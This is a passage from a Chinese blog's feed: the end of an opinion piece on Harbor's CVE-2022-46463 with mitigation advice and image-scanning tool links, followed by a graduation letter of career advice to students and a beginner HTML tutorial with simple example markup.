公开仓库，若将私有业务镜像放置于公开仓库，可能存在信息泄漏风险。</p><h3 id="漏洞级别">漏洞级别</h3><p>中危偏低，无需紧急修复，但仍需引起注意，排查仓库权限设置是否正确。</p><h3 id="漏洞修复建议">漏洞修复建议</h3><p>官方最新版本仍存在上述特性，升级修复属于无稽之谈。</p><h4 id="对于无public需求的用户">对于无public需求的用户</h4><p>直接全部设置为私有项目即可。</p><h4 id="对于仍需public功能但又担心风险的用户">对于仍需public功能但又担心风险的用户</h4><p>可以手动创建一个全局用户，然后将这个用户添加到所有项目中，最后将所有项目设置为私有。</p><p>这么做可能会导致，原本可以直接获取到的镜像信息，现在都需要使用该账户进行认证后获取，可能会对您的自动化业务(如 CI/CD) 产生影响。</p><p>除此之外，您也可以考虑从根源解决问题。该漏洞最大的安全隐患在于 敏感信息的泄漏。而这些风险来自于没有进行过安全检查的公开镜像。因此，可以使用云安全工具进行检测，如：使用 <a href="https://rivers.chaitin.cn/app/veinmind">Veinmind-SaaS</a> 版本对harbor仓库进行扫描，支持云探针扫描方式，无需部署探针，实现快速一键式解决公开镜像的安全问题：<br><img src="/img/16740240275239.jpg" alt=""><br>也可以选择轻量级的 <a href="https://github.com/chaitin/veinmind-tools">Veinmind-Tools</a> 对您重点关注的镜像，一一进行人工排查，保证您的镜像安全。<br><img src="/img/20220415144819.gif" alt=""></p><p>除此以外，对于仍认为 <code>public</code> 仓库应该在登陆后才能够被访问的用户，可以选择非harbor的同级别产品如<a href="http://port.us.org/documentation.html">portus</a>，所有的仓库必须在登陆后才有权限访问，即使是public仓库。</p><h2 id="最后">最后</h2><p>整个CVE 从最初的大家都无法复现却存在编号的漏洞，到有人站出来说根本不应该称之为漏洞，再到认为Harbor的设计不合理，没有做到所谓的“尽可能的安全设置作为默认设置”，到最后的呼吁不要仅关注漏洞本身，而是要更关注客户的安全，为客户负责的角度。 这个&quot;漏洞&quot;属实在2022年的年终 荒诞而又魔幻的 结束了这荒诞而又魔幻一年。</p><p>从安全的角度来想，我不理解为什么这样的一个&quot;漏洞&quot;，如此简单粗暴的过程，无官方的fix记录，仅有一堆雷同式的公告，却鲜有不同的声音。</p><p>从产品的角度上来想，我觉得这类的安全问题，并不是一个产品上能够 cover 的事情，而是用户意识上的安全。类比弱口令，如果我们真的认为，默认复杂的密码就可以解决弱口令的问题，而没有关注用户自身意识的安全建设，那么对于安全意识较差的用户来讲，他甚至可能会觉得默认密码过于复杂而吐槽产品，然后自行将密码修改为了弱口令。为什么一个开源的产品，明确写的特性，明确写的功能提示，还需要为用户的安全意识建设买单？</p><p>手机很好用，但你总担心手机屏幕的屏保图片会被别人偷窥到你的隐私，你很担心，因为你把有银行卡密码的图片作为了屏保，说这个手机要是屏幕保护不会被偷窥就好了，手机做的还是不够好啊。</p><p>有没有一种可能，当大家都意识到屏幕保护就是要给别人看的时候，就不会把隐私的图片，设置为屏幕保护了？我们作为专业人员要做的，是告诉用户，用密码做屏幕保护，这么做不安全，提高用户的意识，而不是和用户一起诟病手机这产品为什么不去做一个只有我自己能看到屏幕保护的功能，去对线开源社区去争执一个特性到底是否是漏洞。</p><p>见贤思齐焉，见不贤而内自省也。不论这个CVE最终会如何收尾，不论这个事情会走向何种结局，对于使用了harbor的用户，看到了这个CVE, 都应该思考一下，对于public的理解是否正确，自家使用的harbor会不会同样存在安全隐患；是否需要考虑镜像安全的检测来加强防护。</p><p>最后也希望，大家能对开源社区多一些包容，多站在互相的角度进行思考，多把精力集中到一些有价值的事情上去。安全和产品，从来不应是对立面，也永远不会是对立面。</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Veinmind-SaaS : <a href="https://rivers.chaitin.cn/app/veinmind">https://rivers.chaitin.cn/app/veinmind</a><br>1.Veinmind-Tools : <a href="https://github.com/chaitin/veinmind-tools">https://github.com/chaitin/veinmind-tools</a><br>2.portus : <a href="http://port.us.org/documentation.html">http://port.us.org/documentation.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Harbor 未授权漏洞的背后是魔幻的荒诞主义&lt;/h1&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;怎么说呢，心里五味杂陈，面对在大年前横空而来的 &lt;code&gt;CVE-2022-46463&lt;/code&gt;，以及一通测试复现后，面对着电脑屏幕久久说不出话来，于是便有了这篇</summary>
      
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="云安全" scheme="http://blog.dvkunion.cn/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
  </entry>
  
  <entry>
    <title>给学弟学妹的一封信</title>
    <link href="http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/"/>
    <id>http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/</id>
    <published>2020-06-22T20:09:12.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>给学弟学妹的一封信</h1><p><i>2020-6-22</i><br>我毕业了......</p><hr><h2 id="b-0x00-序-b"><b>0x00 -- 序</b></h2><!-- split --><p>首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。</p><p>写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个<b>学妹</b><del>(和学弟)</del>会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。</p><p>希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡</p><span id="more"></span><blockquote><p>P.S. 写完了之后我发现我的废话真的是很多，所以在这里加一个课代表的座位总结一下每个章节的重点，供后辈们有选择性的进行阅读，珍惜各位的时间。</p><ul><li><a href="#0x0A">0x01 我的大学四年生活详情</a></li><li><a href="#0x0B">0x02 大学四年期间的一些个人感悟和心得</a></li><li><a href="#0x0C">0x03  Q&amp;A 一些常见问题</a></li><li><a href="#0x0D">0x04 个人的一些建议</a></li><li><a href="#0x0F">0x05 祝福语</a></li></ul></blockquote><h2 id="b-id-0x0A-0x01-我的四年-b"><b id=0x0A>0x01 -- 我的四年</b></h2><p>现在想想四年的时间真的是过的很快，2016年刚入学校时候第一个感觉是略有失望，因为学校太小哈哈哈哈哈我总以为大学起码要大一点才能突显和高中的不同。其实总的来说我们学校地理位置还是很优越的，毕竟不是哪个学校都能紧挨着一个湖，离火车站一站地铁、市中心3站地铁的优越位置。╮(╯_╰)╭</p><p>大一刚入学，我是彻底的玩了一年，毕竟经过了恶心的高中终于解放了，所以大一基本没什么好说的，参加各种社团活动，各种团建，爽是真的爽，但是欠下的债总要还的。</p><p>到了大二才算是准备看一看自己能够做些什么了，大二也是我参加各种活动最多的一年。从参加蓝桥杯为契机，到参加电子设计竞赛，再到大创、数学建模、ACM区域赛(我太菜了都不好意讲出来)，直到最后的CTF竞赛。基本算是学校本院内能够参加的一些竞赛我都在这一年内去尝试了一遍(也就是尝试了一遍而已，基本都是成功参与(´Ａ｀。))。有好处也有坏处吧，好处是我就和逛菜市场一样转了一大圈最后才买到自己想要的萝卜，但总归是买到了，而且在这个过程中也学到了不少新鲜的东西。坏处就是浪费了整整一年的时间，才发现了自己喜欢和想要去做什么。</p><p>我一直是电子系专业的，但是实在是对各种电路打不起兴趣，也尝试去参加电子设计大赛试试能不能改观一下对这个专业的印象，然后并没有什么卵用，喜欢就是喜欢，不喜欢就是不喜欢。当时在大一结束也考虑不如直接就转专业去计算机系，然后纠结的考虑了很久之后觉得要重修的课比较多，同时还比较年轻，有自信觉得就算在电子系也能兼顾两边进行学习....(〒︿〒)我也不知道我哪来的自信(其实就是懒不想补课)。然后就错过了最佳的转专业的机会，到了大二专业课开课后就十分的难过了.....信号系统真不是人学的。(QAQ)</p><p>也是因为大二和学长(钱学长)交流之下，我确定了不去参加考研。当时的眼光还仅限于在学校之内，接触到、了解到的事物还仅限于学校之内。在大二升大三的暑假和学长的交流下才了解到出了校门之后，外界使用的一些技术、都有哪些工作、工作都是干些什么的。这也是当时学长给我的最好的建议，如果已经决定不考研的话，能尽早出来感受一下工作的分为就尽早感受，这样你能很快的了解到，互联网这个行业到底是一个什么样子的，而不是仅在学校这个像庇护所一样的圈子内一直坐着等着。</p><p>于是大三就是我走出舒适圈的一个转折点，因为不是计算机专业，计算机网络、Linux等等基础性的东西我都仅是一知半解，没有一个体系化的知识框架，再加上我个人的自制力比较差，自学可能就是三天打鱼两天晒网最后不了了之了，我报了一个外部的培训班，算是从宏观面上整体的对基础性的知识有一个体系化的学习和了解。同时也充分利用学校的资源，蹭了几节胡老师的计算机网络的课，也得到了不少的收获。</p><p>总的来说，大三是我在确定了自己的方向后，开始针对这个方向需要的一些技能和要求进行专业性的学习。也是最痛苦的还债的一年。基本上是周一周五先要照顾自己专业的课程，有空课去计算机系蹭一下课，周末两天要坐地铁到南大附近上课培训，基本是没有什么休息的时间了。晚上回来之后还要去更新笔记，如果有操作的一些东西尽量都要自己动手去操作一遍。这样度过了一个难熬的学期。</p><p>然后就到了大三的寒假，准备开始尝试投递简历找一份实习了。第一次投简历也是很愁人，怎么做简历、怎么找公司信息、怎么准备笔试面试...都没有做过，也不知道怎么去准备。也不知道自己的技能有没有符合招聘的标准、能不能胜任岗位的工作、会不会太菜了被面试官笑话等等等等...相对来说投简历的确会十分焦虑，每天期待着自己的邮箱多一个小红点，然后发现收到的邮件是：很抱歉，您不符合我们的岗位要求。心态直接炸裂......</p><p>但最终还是找到了一家在南京本地的实习机会。出来实习之后就真的发现，工作和学校里就有着很大的区别。基本上很少有时间来给你去进一步的沉淀自己的知识积累，工作就是把你以前所有积累的东西拿出来用一用了，你沉淀了多少东西，就能在工作中产生多大的价值。</p><p>也是因为有了这一段宝贵的实习经历，让我在后面的正式应届招聘里有了一张强力的底牌，也是最后我认为能拿到offer的关键一点。<b>所以如果你确定是不考研准备工作，那么务必！务必！要找一个有价值的实习工作。  </b></p><p>总的来说我的四年大学生活，其实真的就是只有三年，第一年用来娱乐享受；第二年参加各种竞赛，认识了各种各样有趣的人和朋友，参加到了计协大家庭，给了我很多前进的动力；第三年用来艰苦奋斗，开始为自己喜欢的事情做好充足的准备；第四年的时候就已经很少在学校了。</p><p>时间是真的过的很快的，我的大学四年也大概就是这个样子。</p><h2 id="b-id-0x0B-0x02-个人心得-b"><b id=0x0B>0x02 -- 个人心得</b></h2><p>如果说要让我来谈一下大学四年间生活的一些感悟和心得，那我觉得最重要的就是，<b>在大学期间加入了自己喜欢的圈子，认识了一群有趣的人。</b>我一直很感激能加入了计协，从一开始的C代码都写不好的菜鸡，被郭佬吉佬带到能称为计协技术部部长：计协有大一黝黑平头、满嘴火车炮但是认真教你写代码的郭佬(狗头)、陪我在机房一起熬到9点多的杜杜、一起准备比赛的吴同学、专业知识丰富的吉佬等等；也很感激在参与众多竞赛遇到的各路大神，像在数模认识的陆大佬、蒋神，他们的逻辑思维和数学能力给了我不少启发，还有我的数模队友，漂亮的写手李小姐姐、专业严谨的冯同学、以及提供给我不少工作经验的郑同学；以及在其他竞赛里遇到的在其他领域突出的一些大佬。在和大佬的交流和生活之中会不自然的被他们影响，朝着他们学习。所以我很感激通过各种方式能够认识这些优秀的人，从他们身上或多或少的学习到一些东西。</p><p>除此之外，我觉得在我大学生活中同样起到很大帮助的是和<b>正确的</b>老师多沟通。老师往往能给我们很多的经验和处理问题的方法，具有很高的参考价值。多和好老师<b>(纳姐)</b>多多沟通，听一听老师的建议往往对你迷惑的时候会很有帮助。</p><p>再要回想的话，也就是能感谢在大三坚持下来的自己吧。刚入门的时候真的是什么也不会、什么也做不出来。研究一个东西一星期最后什么结果也没有，能在这种绝望的情况下一次又一次的坚持下来，沉淀出到现在的一些东西，可能换做现在的我是已经做不到了的。</p><h3 id="b-id-0x0C-0x03-Q-A-一些问题-b"><b id=0x0C>0x03 -- Q&amp;A 一些问题</b></h3><p><b><font color = "red">Q：到底是应该考研还是工作？ </font></b></p><p><b>Me:</b> 这问题在大二暑假就很折磨我，我想一般处在这个时间节点的同学都有着这个问题，我到底是应该考研还是应该准备工作？还是应该着手两方面同时准备？</p><p>在大二之前，我是没有什么想法的，对社会上有哪些工作岗位、工作具体都是做些什么的都不了解，对考研也只有一个是升学的概念。眼看已经大二升大三了，准备考研的同学都开始准备要复习了，我却还没决定好到底是考研还是工作。然后就在一个偶然的机遇下和已经工作的学长聊了聊，给了我不少的启发，然后就奔向&quot;愉快&quot;的工作了。</p><p>至于我个人，我依旧是这个看法：考研和工作，应该取决于你到底想要做什么？考研能让你有一张更具有竞争力的王牌，能够让你在未来的竞争中能从大众的筛选线脱颖而出；同时考研给了你更多的缓冲期，你可以用更多的时间去积累、沉淀你的知识和技能。而工作，锻炼的更多的是你的综合能力。因为企业招聘应届生通常看中的更多是这个人的可塑性，所以更考察你接受新事物的能力、学习能力、以及和工作同事、上级的沟通能力、执行能力，最后还要求你的技能要能够符合岗位基本需求，相比考研更像是开始应用你这些年积攒下的知识财富。</p><p>通过对这两个不同路线的描述，你要考虑的是未来的你想要做一些什么？ 未来是想要进入大厂，在技能上做一些研究？还是想要接触最前端的技术，做一些人工智能、大数据分析等等听起来很上流的工作？还是准备搞科研，读博士，或者是就是想做一个码农，搞开发？根据你想要做的事情的不同，你要选择那条路也就一清二楚了。要说的是，这两条路没有什么好坏之分，没有什么哪一条比另一条会更好这一种说法，只要你能确认，你是因为自己想要做的事情需要我考研(或工作)，而不是因为跟随大家&quot;好多同学都考研(工作)了我也去考研吧(工作吧)&quot;这种想法，我觉得就没有任何问题。</p><p><b><font color = "red">Q：计算机专业出身到底能做些什么事情？</font></b></p><p><b>Me:</b>说实话对于这个问题我只能以我现在的菜鸡视野来给你们解答，因为我也是一个刚入职场的小白。一般来说，互联网行业从服务对象上来分类分为甲方和乙方：甲方通常指提出需求的一方，而乙方就是来实现甲方爸爸需求的一方。按照这种分类，公司的职能体系也会有所不同，招聘的岗位也会有所不同。</p><p>技术岗位通常会比较偏向技术，需要有一定的专业技术能力，如开发岗，包含各种各样的语言开发：java、python、go、c++等等，岗位顾名思义就是进行产品代码开发；还有运维岗：这个岗位偏向IT技术一些，需要对电脑的常识和硬件有一定了解，日常负责维护机房、监控一些服务的运行状态等等。大一点的公司运维岗会分的很细，有专门负责网络的网络工程师、负责维护和监控服务器的运维工程师，负责数据库维护的DBA等等；再大一点的公司可能会有架构师的岗位，负责设计公司某个项目的整体框架：使用哪些技术栈、要用什么语言、什么协议进行通信，数据库的选型等等；除了这些之外还有很多很多的岗位：测试岗，测试开发岗、自动化岗位等等等等。很多公司还会按照自己的需求去招聘一些公司特有的岗位。</p><p>如果你还不知道自己想做什么，不妨去各大大型互联网公司的官方招聘网站上，看一下招聘的岗位和岗位需求描述。你能够很快的知道，大公司里面有什么样的岗位、使用什么样的技术，后面在学习的时候可以针对性的在这个方面进行研究学习。</p><p><b><font color = "red">Q：XXX竞赛有价值吗？值得参加吗？</font></b></p><p><b>Me:</b> 如果你是一位大一或大二的同学，不论你提问的竞赛是什么，我都会告诉你，有价值！参与就完事了。但是如果你已经大三或步入大四了，那么我觉得你就要考虑一下，这个竞赛到底是做什么的，对我到底能不能起到一些帮助。因为在大一和大二，你是有大把的时间来进行不断地尝试，来遇见各式各样的人，竞赛会成为一个很好的平台来帮助你丰富完善你的大学生活；而大三大四你已经要开始为马上到来的远征准备冬粮，时间是十分宝贵的，你能在这个冬天存多少粮食，在未来的考研战场或是面试战场上你就有多少的底气去拼。所以每一个选择都要问一下自己，是否还需要这样做了。对于大三和大四的同学，我觉得不仅仅是要考虑竞赛这个问题，对于一些其他的活动，都应该以这样的一个角度去思考了。因为到了这个节点时间真的是很不够用了。以工作为例，大三上学期的寒假最好就可以去尝试投递简历、尝试找一份实习的工作，大三下的暑假就已经是秋招了。<b>千万不要以为秋招是大四暑假毕业才开始的!!!!!</b>而且很多大厂的秋招和春招都会有提前批，使你的准备时间更少。时间还是非常宝贵的。</p><p><b><font color = "red">Q：怎么准备春招/秋招？</font></b></p><p><b>Me:</b> 首先准备春招/秋招，你需要一份简历。对自己没有那么足的自信的同学，我建议你需要一份自己的简历模板。什么意思呢？就是你需要按照不同公司对岗位的描述，来修改你的简历，有针对性的投递，这样成功率往往会成功很多；对自己经历和技能很满意的，也可以直接做一份通用式的简历，然后直接拿出来用就可以了。简历没有什么具体的要求，它类似于一份自我介绍，让对方企业以最快的方式了解你这个人。一般来说要包含你的个人信息、学校经历(觉得自己成绩不错的同学也可以在简历里提一下，突出你自己的优势)、实习或工作经历等。<b>简历很重要，往往后面的面试过程，面试官都是根据你的简历里面写的内容进行提问的，所以不要为了满足岗位要求而写了一堆虚假的信息。</b></p><p>一般来说 春招 是 秋招的一些补充，往往秋招没有招满的企业会继续在春招发布招聘启事，或事招聘一些实习岗位。<b>所以春招是寻找实习的最佳机会。</b>一般春招是从寒假的年后开始，2-3月份的样子，当然像腾讯阿里等等通常都会提前开启招聘通道，需要自己去关注。</p><p>秋招就是正式的应届招聘了，一般秋招在6-8月份开始，近些年出现的提前批等等导致其实在4月、5月就已经有一些秋招的信息了。这些招聘信息你可以在一些应届招聘的网站如：牛客网、实习僧等等找到统一的招聘启事，偶尔还有有内推的帖子；但最正规的途径还是去这个公司的官网。找到一个名称类似于人才招聘的链接，然后一般大厂都会有专门的校招页面。可以在这里面去寻找本年度该公司需要的人才。这样做同样也有一个好处：你的简历是直接推送到对方企业的，而不是经过那些第三方平台的存储，可以减少你个人信息泄漏的风险。</p><p>我当时的方法是：通过牛客网等等提供的统一招聘信息，知道了有哪些公司在进行招聘，然后通过谷歌去找到他们官网，在他们的官网获取到更详细的信息后进行投递。</p><p>春招秋招的大体流程都是差不多的，投递简历，等待简历筛选，通知笔试/面试，参加一面/二面/三面......最后如果都通过了进入HR面，和你谈论你的薪资定位以及公司的福利待遇，如果没什么问题就会给你发放offer进行签订，招聘的流程基本就完成了，剩下的就是等毕业后拿着毕业证、学位证去公司报道就可以了。</p><p>在投递简历的时候我个人的建议是：多尝试！不要怕失败，因为失败最多就是收不到回复邮件或是收到了拒绝邮件....(´Ａ｀。)多被拒绝几次就习惯了，但是对你个人来说是你自己的一次宝贵的经验！而且，说不定你多投递的这一家，丫就成功了呢？(,,・ω・,,)人如果没有梦想，那和咸鱼有什么区别？</p><p>最后放一张我当年投递简历做的表，真的是一段艰苦却很有价值的岁月。</p><p><img src="/img/WX20200630-152324%402x.png" alt="投递的一部分截图"></p><p>我暂时就想到这些问题，如果还有其他的问题，也可以在QQ上联系我，如果我知道的都会尽力去帮你解答。</p><h2 id="b-id-0x0D-0x04-个人的一些建议-b"><b id=0x0D>0x04 -- 个人的一些建议</b></h2><p>(*´∀`)~♥其实说实话我不太喜欢给别人建议，因为我觉得每个人的情况都不相同，所以很多选择或是方法并不能对所有人都起到作用，而且我也不是什么很有价值的前辈，只是一个比你们早几年结束了学习生活和你们一样的菜鸡(╥﹏╥)。所以这一块大家也就是听听就好，觉得有用的话就参考一下下就可以。</p><p>首先是大学生活方面，一定不要浪费了大学的这四年生活，因为这是你去学习、去了解一些东西的最好的时间段，同时还有一群人能陪你一起去学习进步。等到工作或是读研之后，时间就变得十分紧迫了，接触和学习的范围也变得狭窄了，仅限于自己工作的内容或是研究的内容了。所以大学四年的时光一定要好好的珍惜。</p><p>其次是学习的一些方法，一定要做好沉淀和积累，可以是以笔记的形式，我个人更推荐已博客这种形式，提倡开源和分享精神。可以是一个小的知识点，也可以是一整块大的知识体系框架。在刚开始的时候可能没有什么感觉。等你坚持了一段时间你会发现，原来已经有了这么多的东西。同时这也是你复习和避免未来忘记的好帮手，我现在有些命令还需要查我以前的博客才能想起来怎么用......</p><p>最后是心态上的一些建议。大三那一年真的是忙碌的一年，上完专业课再去别的班级蹭课，周末再自己一个人做好几站的地铁去遥远的南大，和一群其他学校的陌生人一起听课。赶上投递的简历又总被pass，找不到工作，真的是精神很压抑的一阵。所以多和自己的小伙伴聊聊天，适当的也要学会自己缓解自己身上的压力，如果没法调节好自己的心态你会发现所有的事情都会变得越来越糟。和有可能你刚被上一个面试官嘲笑完，就要马上进行下一轮面试，你不能把刚才的情绪带到一段新的对话当中。抽时间可以去玄武湖走一走，转换一下心情，熬过去这一段最痛苦的时光就是柳暗花明。</p><h2 id="b-id-0x0F-0x05-祝福语-b"><b id=0x0F>0x05  -- 祝福语</b></h2><p>在离开学校的最后，留给学弟学妹们几句祝愿吧。</p><p>愿你们都能够学业有成，拿到自己想要学校或公司的offer。</p><p>愿你们都拥有似锦前程，在喜欢的未来做着自己喜欢的事情。</p><p>愿你们都怀着感恩之心，行程千里不忘恩师(纳姐)滴水之恩。♥(´∀` )人</p><p>愿你们都沐浴到幸运女神的眷属，在未来不要遇到太多的艰苦和歧途。</p><p>愿你们有一天都能与重要的人相逢。</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;给学弟学妹的一封信&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2020-6-22&lt;/i&gt;&lt;br&gt;
我毕业了......&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;b-0x00-序-b&quot;&gt;&lt;b&gt;0x00 -- 序&lt;/b&gt;&lt;/h2&gt;
&lt;!-- split --&gt;
&lt;p&gt;首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。&lt;/p&gt;
&lt;p&gt;写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个&lt;b&gt;学妹&lt;/b&gt;&lt;del&gt;(和学弟)&lt;/del&gt;会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。&lt;/p&gt;
&lt;p&gt;希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡&lt;/p&gt;</summary>
    
    
    
    <category term="essay" scheme="http://blog.dvkunion.cn/categories/essay/"/>
    
    
    <category term="随笔" scheme="http://blog.dvkunion.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>前端基础</title>
    <link href="http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"/>
    <id>http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2019-07-22T23:43:22.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>前端基础</h1><center><small>2019-07-22</small></center>感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。把全栈的知识补一补。  <center><small>华丽的分割线</small></center><hr><h3 id="b-0x00-简介-b"><b>0x00- - 简介</b></h3><p>说到前端，想到的无非就是三个兄弟：HTML CSS JavaScript。<br>所以就按照顺序把这三个兄弟都熟悉一遍，相对来讲Html和CSS会简单一些，重点在Js上多下一些功夫。</p><h3 id="b-0x01-HTML-b"><b>0x01- - HTML</b></h3><p>Html又被称作超文本标记语言，是我们在构造web网页的一种基础的标准语言。浏览器会将其解析成我们所看到的网页格式。<br>在接触过Markdown语法之后，其实感觉HTML语言是和其十分类似的。不同的是作为标记的标签在html中是成对出现的，是一种标记标签 (markup tag)。</p><p>HTML还有一个兄弟叫做HTML5。emmm一开始也分不清这两个东西，类似于python2 和python3的感觉吧，h5的语法和声明上和html略有不同，增加了很多人性化的标签。可以看作是一个更新的版本吧。</p><p><b>声明</b><br><code>&lt;!DOCTYPE html&gt;</code><br>一般在.htm .html文件的开头，总会有这样一句。用于声明该文件为html5文件。<br>不同版本的html语言所用的声明有所不同。</p><p><code>&lt;html&gt;&lt;/html&gt;</code><br>这对标签声明了html页面的主体部分，展示html的根元素。</p><p><code>&lt;head&gt; &lt;/head&gt;</code><br>head标签声明了html头部分，描述文档的数据内容。</p><p><code>&lt;body&gt; &lt;/body&gt;</code><br>body标签声明了html内容的主体部分，展示所呈现给浏览器可视化的部分。</p><p>这几部分的声明就可以构造出一个简单的标准html页面，例如我们写出一个hello world的页面：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">            &lt;title&gt; Hello Html &lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello world &lt;/h1&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>保存为html格式后直接用浏览器打开即可看到我们的第一个html页面。</p><p><b>元素</b></p><p><code>&lt;title&gt; &lt;/title&gt;</code><br>title是页面的标题，显示在浏览器的工具栏处</p><p><code>&lt;base&gt; &lt;/base&gt;</code><br>base标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接</p><p><code>&lt;link&gt; &lt;/link&gt;</code><br>link标签常用于资源引用，例如css样式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;xxx.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;style&gt; &lt;/style&gt;</code><br>样式标签</p><p><code>&lt;meta&gt;</code><br>meta标签描述了一些基本的元数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;script&gt; &lt;/script&gt;</code><br>表示js脚本的标签</p><p><code>&lt;hn&gt; &lt;/hn&gt;</code><br>h标签是html标题，一共有6个等级，1-6代表不同等级的标签。</p><p><code>&lt;p&gt; &lt;/p&gt;</code><br>p标签表示这是一个段落</p><p><code>&lt;a&gt; &lt;/a&gt;</code><br>a标签表示这是一个超链接</p><p><code>&lt;img src&gt;</code><br>img标签表示这是一个图片</p><p><code>&lt;hr&gt;</code><br>这个标签表示是一个水平线</p><p><code>&lt;br&gt;</code><br>换行符标签</p><p><code>&lt;b&gt; &lt;em&gt; &lt;i&gt;  &lt;small&gt; &lt;strong&gt; &lt;sub&gt; &lt;sup&gt; &lt;ins&gt; &lt;del&gt;</code><br>文字类标签，表示加粗、着重、斜体、小号字体、加重语气、上下标、插入、删除</p><p><code>&lt;code&gt; &lt;q&gt;</code><br>这几类不常使用的标签，表示代码、引用（非常少见）</p><p><code>&lt;table&gt; &lt;th&gt;&lt;/th&gt;&lt;td&gt; &lt;tr&gt; &lt;/tr&gt; &lt;/td&gt; &lt;/table&gt;</code><br>表格标签</p><p><code>&lt;ui&gt;&lt;li&gt;&lt;/li&gt;&lt;ui&gt;</code><br>列表标签 ui表示无序，ol表示有序</p><p><code>&lt;div&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt;</code><br>容器标签，可以将各种元素放入其中组成一个容器，拥有同样的样式和属性。<br>div多用于整体，span多用于文本。</p><p><code>&lt;form&gt;&lt;/form&gt;</code><br>表单元素，用于装载用户输入内容。</p><p><code>&lt;iframe&gt;&lt;/iframe&gt;</code><br>表示窗口框，可在一个页面上显示多个窗口。</p><p><b>属性</b></p><p>元素在其标签内可以拥有不同的属性，来进行进一步的功能或格式的美化</p><p><code>&lt;a id=&gt;</code><br>id属性表示一个书签标记，在一个html页面中id应该为唯一的。可用于跳转和定位等。</p><p><code>&lt;a href=&gt;</code><br>href属性表示链接的url</p><p><code>&lt;a target=&gt;</code><br>使用target=_blank可以实现在新的窗口打开页面。</p><p><code>&lt;img alr=&gt;</code><br>alt 属性用来为图像定义一串预备的可替换的文本。当图片无法加载的时候作为备用替换上去</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;前端基础&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-07-22&lt;/small&gt;&lt;/center&gt;
感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。
把全栈的知识补一补。  
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/smal</summary>
      
    
